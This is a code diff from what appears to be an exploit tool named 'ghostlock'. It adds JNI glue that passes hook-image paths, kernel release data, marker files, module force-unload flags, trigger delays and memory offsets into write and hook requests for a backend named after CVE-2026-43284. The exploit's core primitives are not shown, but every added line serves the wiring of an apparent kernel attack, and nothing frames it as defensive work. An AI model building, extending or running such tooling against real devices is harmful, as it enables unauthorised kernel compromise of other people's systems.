@@ -771,6 +771,24 @@ namespace ghostlock::jni {
         /* usable_for_access() == usable_for_initialize() && offset_set，而 usable_for_initialize() 要 sa.set：
            所以写这一层也必须把会话材料带上（上一轮 initialize 缺的就是同一项）。 */
         access_params.sa = sa_material_of(sa_source);
+        /* 2026-10-15：工具那半调用方清单的其余字段（字符串借用式，全部由本栈帧持有）。 */
+        const std::string hook_image = text_of(params_values.accessHookImagePath);
+        const std::string kernel_release_text = text_of(params_values.accessKernelRelease);
+        const std::string success_marker_text = text_of(params_values.accessSuccessMarkerPath);
+        const std::string failure_marker_text = text_of(params_values.accessFailureMarkerPath);
+        const std::string in_flight_marker_text = text_of(params_values.accessInFlightMarkerPath);
+        const std::string module_marker_text = text_of(params_values.accessModuleMarkerPath);
+        access_params.hook_image = access_path_of(hook_image);
+        access_params.kernel_release = access_path_of(kernel_release_text);
+        access_params.success_marker = access_path_of(success_marker_text);
+        access_params.failure_marker = access_path_of(failure_marker_text);
+        access_params.in_flight_marker = access_path_of(in_flight_marker_text);
+        access_params.module_marker = access_path_of(module_marker_text);
+        access_params.kernel_preempt = params_values.accessKernelPreempt;
+        access_params.kernel_modversions = params_values.accessKernelModversions;
+        access_params.kernel_module_force_unload = params_values.accessKernelModuleForceUnload;
+        access_params.trigger_delay_ms = static_cast<std::uint64_t>(params_values.accessTriggerDelayMs);
+        access_params.wait_ms = static_cast<std::uint64_t>(params_values.accessWaitMs);
         backend::cve_2026_43284::steps::WriteRequest request{};
         request.access = g_accesses[slot].get();
         request.params = &access_params;
@@ -816,7 +834,25 @@ namespace ghostlock::jni {
         access_params.carrier_base = static_cast<std::uint64_t>(params_values.accessCarrierBase);
         access_params.offset = static_cast<std::uint64_t>(params_values.accessOffset);
         access_params.offset_set = params_values.accessOffsetSet;
-        access_params.sa = sa_material_of(sa_source);   /* 同 write_image：写这一层也要材料 */
+        access_params.sa = sa_material_of(sa_source);
+        /* 2026-10-15：工具那半调用方清单的其余字段（字符串借用式，全部由本栈帧持有）。 */
+        const std::string hook_image = text_of(params_values.accessHookImagePath);
+        const std::string kernel_release_text = text_of(params_values.accessKernelRelease);
+        const std::string success_marker_text = text_of(params_values.accessSuccessMarkerPath);
+        const std::string failure_marker_text = text_of(params_values.accessFailureMarkerPath);
+        const std::string in_flight_marker_text = text_of(params_values.accessInFlightMarkerPath);
+        const std::string module_marker_text = text_of(params_values.accessModuleMarkerPath);
+        access_params.hook_image = access_path_of(hook_image);
+        access_params.kernel_release = access_path_of(kernel_release_text);
+        access_params.success_marker = access_path_of(success_marker_text);
+        access_params.failure_marker = access_path_of(failure_marker_text);
+        access_params.in_flight_marker = access_path_of(in_flight_marker_text);
+        access_params.module_marker = access_path_of(module_marker_text);
+        access_params.kernel_preempt = params_values.accessKernelPreempt;
+        access_params.kernel_modversions = params_values.accessKernelModversions;
+        access_params.kernel_module_force_unload = params_values.accessKernelModuleForceUnload;
+        access_params.trigger_delay_ms = static_cast<std::uint64_t>(params_values.accessTriggerDelayMs);
+        access_params.wait_ms = static_cast<std::uint64_t>(params_values.accessWaitMs);   /* 同 write_image：写这一层也要材料 */
         const backend::cve_2026_43284::hook::SentryPlan plan =
             backend::cve_2026_43284::hook::device_sentry_plan();
         backend::cve_2026_43284::steps::HookRequest request{};
